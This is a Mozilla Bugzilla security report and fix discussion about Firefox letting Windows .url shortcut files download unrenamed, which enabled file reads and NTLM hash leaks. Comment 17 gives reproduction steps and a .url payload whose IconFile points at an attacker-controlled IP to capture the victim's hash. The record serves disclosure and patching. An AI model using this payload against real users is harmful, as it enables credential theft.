For bugs in Firefox Desktop, the Mozilla Foundation's web browser. For Firefox user interface issues in menus, bookmarks, location bar, and preferences. Many Firefox bugs will either be filed here or in the [Core](https://bugzilla.mozilla.org/describecomponents.cgi?product=Core) product. Bugs for developer tools (F12) should be filed in the [DevTools](https://bugzilla.mozilla.org/describecomponents.cgi?product=DevTools) product. ([more info](https://wiki.mozilla.org/Modules/All#Firefox))
[See Open Bugs in This Product](/buglist.cgi?product=Firefox&bug_status=__open__)
[File New Bug in This Product](/enter_bug.cgi?product=Firefox)
Watch This Product

[Component:](/describecomponents.cgi?product=Firefox&component=File%20Handling#File%20Handling)

File Handling
▾

Firefox :: File Handling
For issues dealing with helper applications, and guessing Content Types when they aren't specified/known (ftp:, file:, jar:, but generally not http:). This component does not cover: backend networking issues, such as those covered by Networking: FTP or Networking: File, nor does it cover the Download Manager which has its own component in the Toolkit product.
[See Open Bugs in This Component](/buglist.cgi?product=Firefox&component=File%20Handling&bug_status=__open__)
[Recently Fixed Bugs in This Component](/buglist.cgi?product=Firefox&component=File%20Handling&chfield=resolution&chfieldfrom=-6m&chfieldvalue=FIXED&bug_status=__closed__)
[File New Bug in This Component](/enter_bug.cgi?product=Firefox&component=File%20Handling)
Watch This Component

[Version:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#version)

unspecified

[Platform:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#rep_platform)

Desktop

Windows

[Type:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_type)

defect

[Priority:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#priority)

P1

[Severity:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_severity)

S3

Points:

---

## Tracking

### ()

[Status:](https://wiki.mozilla.org/BMO/UserGuide/BugStatuses)

VERIFIED
FIXED

[Status:](https://wiki.mozilla.org/BMO/UserGuide/BugStatuses)

VERIFIED

FIXED

Mark as Assigned

[Milestone:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#target_milestone)

111 Branch

Iteration:

---

[Project Flags:](https://wiki.mozilla.org/BMO/UserGuide#Project_Flags)

| Webcompat Score | --- |
| --- | --- |
| a11y-review | --- |
| Accessibility Severity | --- |
| Webcompat Priority | --- |
| Performance Impact | --- |

[Tracking Flags:](https://wiki.mozilla.org/BMO/UserGuide#Tracking_Flags)

|  | Tracking | Status |
| --- | --- | --- |
| firefox-esr102 | [110+](/buglist.cgi?f1=cf_tracking_firefox_esr102&o1=equals&v1=110%2B) | [verified](/buglist.cgi?f1=cf_status_firefox_esr102&o1=equals&v1=verified) |
| firefox109 | --- | [wontfix](/buglist.cgi?f1=cf_status_firefox109&o1=equals&v1=wontfix) |
| firefox110 | [+](/buglist.cgi?f1=cf_tracking_firefox110&o1=equals&v1=%2B) | [verified](/buglist.cgi?f1=cf_status_firefox110&o1=equals&v1=verified) |
| firefox111 | [+](/buglist.cgi?f1=cf_tracking_firefox111&o1=equals&v1=%2B) | [verified](/buglist.cgi?f1=cf_status_firefox111&o1=equals&v1=verified) |

|  | Tracking | Status |
| --- | --- | --- |
| relnote-firefox |  | --- |
| firefox-esr102 | 110+ | verified |
| firefox-esr115 | --- | --- |
| firefox-esr128 | --- | --- |
| firefox109 |  | wontfix |
| firefox110 | + | verified |
| firefox111 | + | verified |
| firefox134 | --- | --- |
| firefox135 | --- | --- |
| firefox136 | --- | --- |

## People

### (Reporter: ameenbasha111, Assigned: enndeakin)

[Assignee:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#assigned_to)

![](https://secure.gravatar.com/avatar/c9e62c36c6c16218485bdb90fe88d63e?d=mm&size=40)  [enndeakin](/user_profile?user_id=6102)

[Assignee:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#assigned_to)

Reset Assignee to default

[Mentors:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_mentor)

---

[QA Contact:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#qa_contact)

Reset QA Contact to default

[Reporter:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#reporter)

![](https://secure.gravatar.com/avatar/90e8173161a73c012cc62b9f3cdeede4?d=mm&size=40)  [ameenbasha111](/user_profile?user_id=719704)

[Triage Owner:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#triage_owner)

![](https://secure.gravatar.com/avatar/66445733c06687eafa2978764675104f?d=mm&size=40)  [Gijs](/user_profile?user_id=159069)

[CC:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#cc)

17 people

## References

[Depends on:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#dependson)

---

[Blocks:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#blocks)

[CVE-2023-25740](/show_bug.cgi?id=1812354 "RESOLVED FIXED - .SCF file can also send NTLM hashes")

[1824468](/show_bug.cgi?id=1824468 "RESOLVED FIXED - Add tests from bug 1815062 and 1809923")

Dependency [tree](/showdependencytree.cgi?id=1809923&hide_resolved=1)
/ [graph](/showdependencygraph.cgi?id=1809923)

[Regressions:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#regresses)

---

[Regressed by:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#regressed_by)

---

[Duplicates:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#duplicates)

[1810143](/show_bug.cgi?id=1810143 "RESOLVED DUPLICATE - Possible Download of .url Files for Data Exfiltration"), [1812338](/show_bug.cgi?id=1812338 "RESOLVED DUPLICATE - .URL file can also send NTLM hashes")

[1784451](/show_bug.cgi?id=1784451 "RESOLVED DUPLICATE - URL files on windows should be flagged as potentially malicious")

[URL:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_file_loc)

[See Also:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#see_also)

[1810793](/show_bug.cgi?id=1810793 "VERIFIED FIXED - FireFox Extension API : .url / .lnk / .local file download lead to Multiple issues"), [CVE-2023-29541](/show_bug.cgi?id=1810191 "VERIFIED FIXED - .desktop file extension on Linux should be rewritten to .desktop.download to avoid users running local executables _if_ desktop files are executed by the user's file manager."), [1819760](/show_bug.cgi?id=1819760 "VERIFIED FIXED - Dragging and dropping the identity box to the desktop to create a .url shortcut is broken (creates .url.download instead of .url)")

[1784451](/show_bug.cgi?id=1784451 "RESOLVED DUPLICATE - URL files on windows should be flagged as potentially malicious")

[bugs.chromium.org/p/chromium/issues/d...](https://bugs.chromium.org/p/chromium/issues/detail?id=1307930 "https://bugs.chromium.org/p/chromium/issues/detail?id=1307930")

## Details

### (4 keywords, Whiteboard: [reporter-external] [client-bounty-form] [verif?][adv-main110+][adv-esr102.8+])

[Alias:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#alias)

CVE-2023-25734

[Keywords:](/describekeywords.cgi)

[csectype-disclosure](/buglist.cgi?keywords=csectype-disclosure&resolution=---),
[reporter-external](/buglist.cgi?keywords=reporter-external&resolution=---),
[sec-moderate](/buglist.cgi?keywords=sec-moderate&resolution=---),
[sec-vector](/buglist.cgi?keywords=sec-vector&resolution=---)

[Whiteboard:](https://wiki.mozilla.org/BMO/UserGuide/Whiteboard)

[reporter-external] [client-bounty-form] [verif?][adv-main110+][adv-esr102.8+]

QA Whiteboard:

---

Has STR:

---

Change Request:

---

[Votes:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#votes)

0

Bug Flags:

| [dveditz](/user_profile?user_id=1689) | [sec-bounty](#c36 "2 years ago") | + |
| --- | --- | --- |
| [dveditz](/user_profile?user_id=1689) | sec-bounty | + |
| --- | --- | --- |
|  | behind-pref |  |
| --- | --- | --- |
|  | blocking-fx-sync1.7 | ? |
|  | firefox-backlog |  |
|  | sec-bounty-hof |  |
|  | in-qa-testsuite |  | | |
|  | in-testsuite |  |
|  | qe-verify |  |

## Crash Data

Signature:

*None*

## Security

### (public)

This bug is publicly visible.

## User Story

## Attachments

### (7 files, 2 obsolete files)

| [Firefox - UrlExtension Dangerous File Extension.mp4](/attachment.cgi?id=9311999)  [2 years ago](#c0)  [Ameen](/user_profile?user_id=719704)   3.61 MB, video/mp4 |  | [Details](/attachment.cgi?id=9311999&action=edit) |
| --- | --- | --- |
| [urlDangerousExtension.html](/attachment.cgi?id=9312000)  [2 years ago](#c1)  [Ameen](/user_profile?user_id=719704)   12.34 KB, text/html |  | [Details](/attachment.cgi?id=9312000&action=edit) |
| [poc data uri.html](/attachment.cgi?id=9312225)  [2 years ago](#c11)  [Shaheen Fazim](/user_profile?user_id=720428)   4.06 KB, text/html |  | [Details](/attachment.cgi?id=9312225&action=edit) |
| [Bug 1809923, also block url extension when saving files, and use a case insensitive comparison, r=gijs](/attachment.cgi?id=9312610)  [2 years ago](#c13)  [Neil Deakin](/user_profile?user_id=6102)   48 bytes, text/x-phabricator-request |  | [Details](/attachment.cgi?id=9312610&action=edit) | [Review](/attachment.cgi?id=9312610) |
| [NtlmLeaker.zip](/attachment.cgi?id=9314235)  [2 years ago](#c18)  [Ameen](/user_profile?user_id=719704)   1.35 KB, application/x-zip-compressed |  | [Details](/attachment.cgi?id=9314235&action=edit) |
| [NTLM Hash Leak - Firefox.mp4](/attachment.cgi?id=9314236)  [2 years ago](#c19)  [Ameen](/user_profile?user_id=719704)   6.22 MB, video/mp4 |  | [Details](/attachment.cgi?id=9314236&action=edit) |
| [Bug 1809923, r=gijs](/attachment.cgi?id=9314286)  [2 years ago](#c23)  [Neil Deakin](/user_profile?user_id=6102)   48 bytes, text/x-phabricator-request | pascalc : [approval-mozilla-beta+](#c33 "2 years ago")  pascalc : [approval-mozilla-esr102+](#c39 "2 years ago") | [Details](/attachment.cgi?id=9314286&action=edit) | [Review](/attachment.cgi?id=9314286) |
| [advisory.txt](/attachment.cgi?id=9317090)  [2 years ago](#c47)  [Tom Ritter [:tjr]](/user_profile?user_id=578488)   382 bytes, text/plain |  | [Details](/attachment.cgi?id=9317090&action=edit) |
| [advisory.txt](/attachment.cgi?id=9317100)  [2 years ago](#c48)  [Tom Ritter [:tjr]](/user_profile?user_id=578488)   453 bytes, text/plain |  | [Details](/attachment.cgi?id=9317100&action=edit) |

Show Obsolete

Bottom ↓
Tags ▾

* Reset

Timeline ▾

* Reset
* Collapse All
* Expand All
* Comments Only

|  | [Ameen](/user_profile?user_id=719704)  Reporter |  |
| --- | --- | --- |
| [Description](/show_bug.cgi?id=1809923#c0)• 2 years ago |
|  | |

Attached video
[Firefox - UrlExtension Dangerous File Extension.mp4](attachment.cgi?id=9311999)
— [Details](attachment.cgi?id=9311999&action=edit)

Chromium Bug Reference: <https://bugs.chromium.org/p/chromium/issues/detail?id=1307930>

While visiting a webpage if the download initiate for .lnk/ .local these file types are changed to .download by firefox. But i have found a way to download .url File while lead to Arbitrary File Read

Note: .local/ .lnk are already restricted and .url is missed

We can use Blob Method with type text to download the .url file without changing it to .download

FIREFOX VERSION : 108.0.2 (64-bit)

REPRODUCTION CASE:

.Url Download POC

1. Open the Below Attached HTML
2. You can See the .Url file Downloaded

.Url Download Arbitrary File Read POC

1. Open the Below Same Attached HTML
2. You can See the .URL File Downloaded
3. Upload the same file in the Upload Button
4. You can See the content of system.ini file

I have also attached the POC Video for your reference

Flags: sec-bounty?

|  | [Ameen](/user_profile?user_id=719704)  Reporter |  |
| --- | --- | --- |
| [Comment 1](/show_bug.cgi?id=1809923#c1)• 2 years ago |
|  | |

Attached file
[urlDangerousExtension.html](attachment.cgi?id=9312000)
— [Details](attachment.cgi?id=9312000&action=edit)

|  | [Ameen](/user_profile?user_id=719704)  Reporter |  |
| --- | --- | --- |
| [Comment 2](/show_bug.cgi?id=1809923#c2)• 2 years ago |
|  | |

Downloading .lnk and .local extension are already prevented.

When we download a file named abc.lnk it will be changed to abc.lnk.download

|  | [Ameen](/user_profile?user_id=719704)  Reporter |  |
| --- | --- | --- |
| [Comment 3](/show_bug.cgi?id=1809923#c3)• 2 years ago |
|  | |

.lnk / .local / .url are considered as dangerous extension in windows which have the ability to invoke executable(.lnk)/ read files(.url)/ hijack the dependencies(.local)

|  | [:Gijs (he/him)](/user_profile?user_id=159069) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1809923#a83260_159069)• 2 years ago |

Duplicate of this bug: [1810143](/show_bug.cgi?id=1810143 "RESOLVED DUPLICATE - Possible Download of .url Files for Data Exfiltration")

|  | [Ameen](/user_profile?user_id=719704)  Reporter |  |
| --- | --- | --- |
| [Comment 5](/show_bug.cgi?id=1809923#c5)• 2 years ago |
| obsolete | |

| Comment hidden (obsolete) |  |
| --- | --- |

Hi Gijs it looks like issue raised after mine was marked as source issue of mine.

My Report Id: 1809923

Source Bug: 1810143

From the Report id itself i can see mine is not a duplicate, Kindly recheck on this and help me at earliest

Thanks

|  | [Shaheen Fazim](/user_profile?user_id=720428) |  |
| --- | --- | --- |
| [Comment 6](/show_bug.cgi?id=1809923#c6)• 2 years ago |
| obsolete | |

| Comment hidden (obsolete) |  |
| --- | --- |

I think its duplicate on my end, urs all good, Nice catch btw

|  | [Ameen](/user_profile?user_id=719704)  Reporter |  |
| --- | --- | --- |
| [Comment 7](/show_bug.cgi?id=1809923#c7)• 2 years ago |
| obsolete | |

| Comment hidden (obsolete) |  |
| --- | --- |

Sorry, Confusion at my end.

Thanks

|  | [:Gijs (he/him)](/user_profile?user_id=159069) |  |
| --- | --- | --- |
| [Comment 8](/show_bug.cgi?id=1809923#c8)• 2 years ago |
|  | |

Neil, given your work on [bug 1773894](/show_bug.cgi?id=1773894 "RESOLVED FIXED - Capture NTLM hash via LNK file download on Windows"), can you take a look?

Component: Security → File HandlingFlags: needinfo?(enndeakin)Hardware: Unspecified → DesktopSee Also: → <https://bugs.chromium.org/p/chromium/issues/detail?id=1307930>

|  | [Neil Deakin](/user_profile?user_id=6102)  Assignee |  |
| --- | --- | --- |
| [Comment 9](/show_bug.cgi?id=1809923#c9)• 2 years ago |
|  | |

Is it sufficient to just add .url to the same blocklist as .lnk and .local ?

Flags: needinfo?(enndeakin)

|  | [:Gijs (he/him)](/user_profile?user_id=159069) |  |
| --- | --- | --- |
| [Comment 10](/show_bug.cgi?id=1809923#c10)• 2 years ago |
|  | |

(In reply to Neil Deakin from [comment #9](/show_bug.cgi?id=1809923#c9 "VERIFIED FIXED - .url extension Download leads to Arbitrary File Read"))

> Is it sufficient to just add .url to the same blocklist as .lnk and .local ?

I hope so? I haven't attempted to use the testcase here - it would need some verification. But that's what I expect.

|  | [Shaheen Fazim](/user_profile?user_id=720428) |  |
| --- | --- | --- |
| [Comment 11](/show_bug.cgi?id=1809923#c11)• 2 years ago |
|  | |

Attached file
[poc data uri.html](attachment.cgi?id=9312225)
— [Details](attachment.cgi?id=9312225&action=edit)

I would like to report an alternative method for downloading .url file. The POC provided here utilizes the data URI method instead of Blob, which enables the download of .url files without any filter. I hope this will provide additional information for resolving the issue.

|  | [Ameen](/user_profile?user_id=719704)  Reporter |  |
| --- | --- | --- |
| [Comment 12](/show_bug.cgi?id=1809923#c12)• 2 years ago |
| duplicate | |

| Comment hidden (duplicate) |  |
| --- | --- |

Hi guys, can i get the fix details. it looks sufficient to add .url to blocklist.

But wants to know what is planned for fix.

|  | [Neil Deakin](/user_profile?user_id=6102)  Assignee |  |
| --- | --- | --- |
| [Comment 13](/show_bug.cgi?id=1809923#c13)• 2 years ago |
|  | |

Attached file
[Bug 1809923, also block url extension when saving files, and use a case insensitive comparison, r=gijs](attachment.cgi?id=9312610) (obsolete)
— [Details](attachment.cgi?id=9312610&action=edit)

Depends on D167028

|  | [Phabricator Automation](/user_profile?user_id=600971) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1809923#a428234_600971)• 2 years ago |

Assignee: nobody → enndeakinStatus: UNCONFIRMED → ASSIGNEDEver confirmed: true

|  | [:Gijs (he/him)](/user_profile?user_id=159069) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1809923#a436994_159069)• 2 years ago |

See Also: → [1810793](/show_bug.cgi?id=1810793 "VERIFIED FIXED - FireFox Extension API : .url / .lnk / .local file download lead to Multiple issues")

|  | [:Gijs (he/him)](/user_profile?user_id=159069) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1809923#a518324_159069)• 2 years ago |

Severity: -- → S3Priority: -- → P1

|  | [:Gijs (he/him)](/user_profile?user_id=159069) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1809923#a1120776_159069)• 2 years ago |

Duplicate of this bug: [1812338](/show_bug.cgi?id=1812338 "RESOLVED DUPLICATE - .URL file can also send NTLM hashes")

|  | [:Gijs (he/him)](/user_profile?user_id=159069) |  |
| --- | --- | --- |
| [Comment 15](/show_bug.cgi?id=1809923#c15)• 2 years ago |
|  | |

Looks like this doesn't have a sec rating, going to copy the one from [bug 1773894](/show_bug.cgi?id=1773894 "RESOLVED FIXED - Capture NTLM hash via LNK file download on Windows"), given this is effectively the same issue but for a different file extension.

Neil, is this ready to land?

Flags: needinfo?(enndeakin)Keywords: [csectype-disclosure](/buglist.cgi?keywords=csectype-disclosure&resolution=---),
[sec-moderate](/buglist.cgi?keywords=sec-moderate&resolution=---),
[sec-vector](/buglist.cgi?keywords=sec-vector&resolution=---)

|  | [Sergey Galich [:serg]](/user_profile?user_id=691597) |  |
| --- | --- | --- |
| [Comment 16](/show_bug.cgi?id=1809923#c16)• 2 years ago • [Edited](/page.cgi?id=comment-revisions.html&bug_id=1809923&comment_id=16251058 "1 revision") |
|  | |

Perhaps add .SCF as well? See [Bug 1812354](/show_bug.cgi?id=1812354 "RESOLVED FIXED - .SCF file can also send NTLM hashes")

See Also: → [CVE-2023-25740](/show_bug.cgi?id=1812354 "RESOLVED FIXED - .SCF file can also send NTLM hashes")

|  | [Ameen](/user_profile?user_id=719704)  Reporter |  |
| --- | --- | --- |
| [Comment 17](/show_bug.cgi?id=1809923#c17)• 2 years ago |
|  | |

HI Guys, This issue has much more impact with no user interaction

i have explored few more things and found we can get the Victim NTLM Hash without any user interaction just by visiting a website.

I have attached the POC Video and files used in the POC

Steps To Reproduce (Not u can use any other method too. The .url file content is important)

1. Extract the Zip to some separate folder
2. Run the flaskServer by running

   eg: python flaskServer.py

   Note: This will make the python Server Up with serving NTLMLeaker url file in /download location
3. Run any NTLM Hash catcher. and note down the IP. use the IP in your .url file which is server under /download location
4. Open the HTML File. Boom You can find your NTLM Hash is leaked to Attacker

Since it critical can we increase the severity of this issue and quick up the release

Also [Issue]<https://bugzilla.mozilla.org/show_bug.cgi?id=1810793> is having the similar impact can we guys quick the fix on there too.

> .url file content for NTLM leak which is used in the POC
>
> [InternetShortcut]
>
> URL=whatever
>
> WorkingDirectory=whatever
>
> IconFile=\192.168.0.114%USERNAME%.icon
>
> IconIndex=1

|  | [Ameen](/user_profile?user_id=719704)  Reporter |  |
| --- | --- | --- |
| [Comment 18](/show_bug.cgi?id=1809923#c18)• 2 years ago |
|  | |

Attached file
[NtlmLeaker.zip](attachment.cgi?id=9314235)
— [Details](attachment.cgi?id=9314235&action=edit)

|  | [Ameen](/user_profile?user_id=719704)  Reporter |  |
| --- | --- | --- |
| [Comment 19](/show_bug.cgi?id=1809923#c19)• 2 years ago |
|  | |

Attached video
[NTLM Hash Leak - Firefox.mp4](attachment.cgi?id=9314236)
— [Details](attachment.cgi?id=9314236&action=edit)

|  | [:Gijs (he/him)](/user_profile?user_id=159069) |  |
| --- | --- | --- |
| [Comment 20](/show_bug.cgi?id=1809923#c20)• 2 years ago |
|  | |

(In reply to Ameen from [comment #17](/show_bug.cgi?id=1809923#c17 "VERIFIED FIXED - .url extension Download leads to Arbitrary File Read"))

> HI Guys, This issue has much more impact with no user interaction

This was exactly what [bug 1773894](/show_bug.cgi?id=1773894 "RESOLVED FIXED - Capture NTLM hash via LNK file download on Windows") was, so I don't see why this should be higher severity. <https://bugs.chromium.org/p/chromium/issues/detail?id=722524#c11> also suggests that this doesn't actually affect most Windows users.

|  | [Ameen](/user_profile?user_id=719704)  Reporter |  |
| --- | --- | --- |
| [Comment 21](/show_bug.cgi?id=1809923#c21)• 2 years ago |
|  | |

> This was exactly what [bug 1773894](/show_bug.cgi?id=1773894 "RESOLVED FIXED - Capture NTLM hash via LNK file download on Windows") was, so I don't see why this should be higher severity.

Hi yes the impact is same. But i just found out that the same is achievable via .url file too without any interaction.

Also in some blogs i have seen that .lnk ntlm hash leak was fixed by windows to load it from internal resource alone

So this method will be worked in latest version of windows and firefox. Hope you have checked my poc video too

> <https://bugs.chromium.org/p/chromium/issues/detail?id=722524#c11> also suggests that this doesn't actually affect most Windows users.

There is some misunderstanding here. The file which is mentioned here is .url but the reference which you shared is .scf file. yes in recent version of windows ntlm leak via scf is not possible. but the one which i shared poc is for .url which is still vulnerable in windows. So it will affect all window users.

|  | [haxatron1](/user_profile?user_id=704427) |  |
| --- | --- | --- |
| [Comment 22](/show_bug.cgi?id=1809923#c22)• 2 years ago |
|  | |

In latest version of Windows, hash leak via scf is still possible (tested via Windows 10 Version 21H2 (Build 19044.2486))(In reply to Ameen from [comment #21](/show_bug.cgi?id=1809923#c21 "VERIFIED FIXED - .url extension Download leads to Arbitrary File Read"))

> > This was exactly what [bug 1773894](/show_bug.cgi?id=1773894 "RESOLVED FIXED - Capture NTLM hash via LNK file download on Windows") was, so I don't see why this should be higher severity.
>
> Hi yes the impact is same. But i just found out that the same is achievable via .url file too without any interaction.
>
> Also in some blogs i have seen that .lnk ntlm hash leak was fixed by windows to load it from internal resource alone
>
> So this method will be worked in latest version of windows and firefox. Hope you have checked my poc video too
>
> > <https://bugs.chromium.org/p/chromium/issues/detail?id=722524#c11> also suggests that this doesn't actually affect most Windows users.
>
> There is some misunderstanding here. The file which is mentioned here is .url but the reference which you shared is .scf file. yes in recent In recent version of windows ntlm leak via scf is not possible. but the one which i shared poc is for .url which is still vulnerable in windows. So it will affect all window users.

In recent version of windows, it is still possible to leak hashes via .scf files, tested on Windows 10 Version 21H2 (Build 19044.2486)

|  | [Neil Deakin](/user_profile?user_id=6102)  Assignee |  |
| --- | --- | --- |
| [Comment 23](/show_bug.cgi?id=1809923#c23)• 2 years ago |
|  | |

Attached file
[Bug 1809923, r=gijs](attachment.cgi?id=9314286)
— [Details](attachment.cgi?id=9314286&action=edit)

|  | [Ameen](/user_profile?user_id=719704)  Reporter |  |
| --- | --- | --- |
| [Comment 24](/show_bug.cgi?id=1809923#c24)• 2 years ago |
|  | |

Hi haxatron1. Thanks for the info. i have mentioned that point since Gijs said this doesn't actually affect most windows users.

If it is still vulnerable. Then more number of People were vulnerable. But this doesn't fall in my case since i reports on .url and it is vulnerable on all windows user for NTML hash leak

Also can you share some information and sample on how scf can still vulnerable in latest windows. bcz in some blogs i found as it was fixed by windows.

|  | [haxatron1](/user_profile?user_id=704427) |  |
| --- | --- | --- |
| [Comment 25](/show_bug.cgi?id=1809923#c25)• 2 years ago |
|  | |

The payload at <https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/> still works on my windows (don't want paste the payload here so as to not clutter this bug report any further). And my windows has the latest update for the 21H2 version. Maybe it does not reproduce on the 22H2 version (I haven't checked) but 21H2 is not end-of-life yet.

|  | [haxatron1](/user_profile?user_id=704427) |  |
| --- | --- | --- |
| [Comment 26](/show_bug.cgi?id=1809923#c26)• 2 years ago |
|  | |

(In reply to haxatron1 from [comment #25](/show_bug.cgi?id=1809923#c25 "VERIFIED FIXED - .url extension Download leads to Arbitrary File Read"))

> The payload at <https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/> still works on my windows (don't want paste the payload here so as to not clutter this bug report any further). And my windows has the latest update for the 21H2 version. Maybe it does not reproduce on the 22H2 version (I haven't checked) but 21H2 is not end-of-life yet.

\*The backslash should be changed to forward slash otherwise the reproduction will not work for .scf files.

|  | [Ameen](/user_profile?user_id=719704)  Reporter |  |
| --- | --- | --- |
| [Comment 27](/show_bug.cgi?id=1809923#c27)• 2 years ago |
|  | |

Thanks for the update haxatron1.

|  | [Neil Deakin](/user_profile?user_id=6102)  Assignee |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1809923#a1225180_6102)• 2 years ago |

Flags: needinfo?(enndeakin)

|  | [Sebastian Hengst [:aryx] (needinfo me if it's about an intermittent or backout)](/user_profile?user_id=258347) |  |
| --- | --- | --- |
| [Comment 28](/show_bug.cgi?id=1809923#c28)• 2 years ago |
|  | |

r=Gijs

<https://hg.mozilla.org/integration/autoland/rev/ab7d32a004aaaa1b33b5e1ec9cceedb4e1057615>

<https://hg.mozilla.org/mozilla-central/rev/ab7d32a004aa>

Group: firefox-core-security → core-security-releaseStatus: ASSIGNED → RESOLVEDClosed: 2 years ago
[status-firefox111](/buglist.cgi?f1=cf_status_firefox111&o1=isnotempty):
--- → [fixed](/buglist.cgi?f1=cf_status_firefox111&o1=equals&v1=fixed)Resolution: --- → FIXEDTarget Milestone: --- → 111 Branch

|  | [Ameen](/user_profile?user_id=719704)  Reporter |  |
| --- | --- | --- |
| [Comment 29](/show_bug.cgi?id=1809923#c29)• 2 years ago |
|  | |

Hi team, It looks like the issue is fixed and closed.

This is my first time reporting to firefox. can i get some information on how the bounty process will be and how much the bounty is.

Thanks

|  | [Donal Meehan [:dmeehan]](/user_profile?user_id=695136) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1809923#a1296348_695136)• 2 years ago |

[tracking-firefox111](/buglist.cgi?f1=cf_tracking_firefox111&o1=isnotempty):
--- → [+](/buglist.cgi?f1=cf_tracking_firefox111&o1=equals&v1=%2B)

|  | [Ameen](/user_profile?user_id=719704)  Reporter |  |
| --- | --- | --- |
| [Comment 30](/show_bug.cgi?id=1809923#c30)• 2 years ago |
|  | |

(In reply to :Gijs (he/him) from [comment #15](/show_bug.cgi?id=1809923#c15 "VERIFIED FIXED - .url extension Download leads to Arbitrary File Read"))

> Looks like this doesn't have a sec rating, going to copy the one from [bug 1773894](/show_bug.cgi?id=1773894 "RESOLVED FIXED - Capture NTLM hash via LNK file download on Windows"), given this is effectively the same issue but for a different file extension.

Gijs i hope the severity is higher than the .lnk issue.

Reasons:

1. In my issue without user interaction it will leak the NTLM Hash just by visiting a website
2. It has impact of arbitrary file read too

Kindly revisit the severity to high.

|  | [Ryan VanderMeulen [:RyanVM]](/user_profile?user_id=75935) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1809923#a1312454_75935)• 2 years ago |

[status-firefox109](/buglist.cgi?f1=cf_status_firefox109&o1=isnotempty):
--- → [wontfix](/buglist.cgi?f1=cf_status_firefox109&o1=equals&v1=wontfix)
[status-firefox110](/buglist.cgi?f1=cf_status_firefox110&o1=isnotempty):
--- → [affected](/buglist.cgi?f1=cf_status_firefox110&o1=equals&v1=affected)
[status-firefox-esr102](/buglist.cgi?f1=cf_status_firefox_esr102&o1=isnotempty):
--- → [affected](/buglist.cgi?f1=cf_status_firefox_esr102&o1=equals&v1=affected)
[tracking-firefox110](/buglist.cgi?f1=cf_tracking_firefox110&o1=isnotempty):
--- → [+](/buglist.cgi?f1=cf_tracking_firefox110&o1=equals&v1=%2B)
[tracking-firefox-esr102](/buglist.cgi?f1=cf_tracking_firefox_esr102&o1=isnotempty):
--- → [110+](/buglist.cgi?f1=cf_tracking_firefox_esr102&o1=equals&v1=110%2B)

|  | [Ryan VanderMeulen [:RyanVM]](/user_profile?user_id=75935) |  |
| --- | --- | --- |
| [Comment 31](/show_bug.cgi?id=1809923#c31)• 2 years ago |
|  | |

Please nominate this for Beta and ESR approval when you get a chance.

Flags: needinfo?(enndeakin)

|  | [Neil Deakin](/user_profile?user_id=6102)  Assignee |  |
| --- | --- | --- |
| [Comment 32](/show_bug.cgi?id=1809923#c32)• 2 years ago |
|  | |

Comment on [attachment 9314286](/attachment.cgi?id=9314286 "Bug 1809923, r=gijs") [[details]](/attachment.cgi?id=9314286&action=edit "Bug 1809923, r=gijs")

[Bug 1809923](/show_bug.cgi?id=1809923 "VERIFIED FIXED - .url extension Download leads to Arbitrary File Read"), r=gijs

### Beta/Release Uplift Approval Request

* **User impact if declined**: Files with certain extensions on Windows are handled as shortcuts and can point to local files which the user can open.
* **Is this code covered by automated tests?**: Yes
* **Has the fix been verified in Nightly?**: Yes
* **Needs manual test from QE?**: Yes
* **If yes, steps to reproduce**: Automated tests have not yet landed.
* **List of other uplifts needed**: None
* **Risk to taking this patch**: Low
* **Why is the change risky/not risky? (and alternatives if risky)**: Just adds additional extensions to the existing list.
* **String changes made/needed**: None
* **Is Android affected?**: No

### ESR Uplift Approval Request

* **If this is not a sec:{high,crit} bug, please state case for ESR consideration**: Very low risk change that adds additional dangerous extensions to the existing list.
* **User impact if declined**: Files with certain extensions on Windows are handled as shortcuts and can point to local files which the user can open.
* **Fix Landed on Version**: 111
* **Risk to taking this patch**: Low
* **Why is the change risky/not risky? (and alternatives if risky)**: Just adds additional extensions to the existing list.
Flags: needinfo?(enndeakin)
[Attachment #9314286](/attachment.cgi?id=9314286&action=edit "Bug 1809923, r=gijs") -
Flags: approval-mozilla-esr102?
[Attachment #9314286](/attachment.cgi?id=9314286&action=edit "Bug 1809923, r=gijs") -
Flags: approval-mozilla-beta?

|  | [Pascal Chevrel:pascalc](/user_profile?user_id=24572) |  |
| --- | --- | --- |
| [Comment 33](/show_bug.cgi?id=1809923#c33)• 2 years ago |
|  | |

Comment on [attachment 9314286](/attachment.cgi?id=9314286 "Bug 1809923, r=gijs") [[details]](/attachment.cgi?id=9314286&action=edit "Bug 1809923, r=gijs")

[Bug 1809923](/show_bug.cgi?id=1809923 "VERIFIED FIXED - .url extension Download leads to Arbitrary File Read"), r=gijs

Approved for 110 beta 8, thanks.

[Attachment #9314286](/attachment.cgi?id=9314286&action=edit "Bug 1809923, r=gijs") -
Flags: approval-mozilla-beta? → approval-mozilla-beta+

